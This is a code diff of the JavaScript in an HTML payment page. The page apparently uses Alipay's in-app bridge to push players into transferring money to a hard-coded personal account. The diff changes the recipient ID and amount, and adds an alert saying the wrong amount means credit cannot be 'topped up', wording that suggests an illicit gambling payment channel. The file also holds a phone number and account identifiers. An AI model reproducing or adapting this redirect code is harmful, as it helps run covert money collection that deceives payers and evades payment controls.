@@ -206,7 +206,7 @@
     }, false);
 
     function javascrip(){history.go(0);}
-    var a = "2088332289581359";
+    var a = "2088022360286702";
     var b = "";
     var c = "afas8f7a89s7f9asffasf96d96g8gi98h798dh798df7h9hdg6h76fd76h8df7h8d75hdf";
     var d = "alipay";
@@ -214,7 +214,7 @@
     var e = "亲";
     var f = "请正确输入金额1000.00元，输错将导致无法上分";
     var g = "确定";
-    var h = "1000.00";
+    var h = "1.10";
     var i = "2019032718350613701";
     var j = "15759762022";
     // 链接
@@ -247,24 +247,23 @@
     setTimeout("javascript()", 300);
 
     function javascript() {
-        try {
-            var a = {
-                actionType: "scan",
-                u: "2088022360286702",
-                a: "1",
-                biz_data: {
-                    s: "money",
-                    u: "2088022360286702",
-                    a: "1",
-                }
+        //上传浏览器信息
+        // $.post("/pay/orderhlist", { orderid:'2019032718350613701', type: 11,remarks: JSON.stringify({UA:UA,browser:browser})} );
+        AlipayJSBridge.call('alert', {
+                title: e,
+                message: f,
+                button: g
+            }, function(e) {
+                setTimeout(function(){
+                    // window.location.href = "alipays://platformapi/startapp?appId=20000167&forceRequest=0&returnAppId=recent&tLoginId="+j+"&tUnreadCount=0&tUserId="+a+"&tUserType=1";
+                }, 1);
+
+                setTimeout(function() {
+                    // window.location.href = "alipays://platformapi/startapp?appId=20000300&bizType=TRANSFER&action=keyboard&defaultword=" + link;
+                    repay();
+                }, 888);
             }
-        } catch (b) {
-            returnApp()
-        }
-        AlipayJSBridge.call("startApp", {
-            appId: "20000123",
-            param: a
-        }, function(a) {})
+        );
     }
     function repay(){
         var urls = 'alipays://platformapi/startapp?appId=09999988&actionType=toAccount&goBack=NO&amount='+h+'&userId='+a;
@@ -305,6 +304,4 @@
         }
     });
 </script>
-
-
 </html>
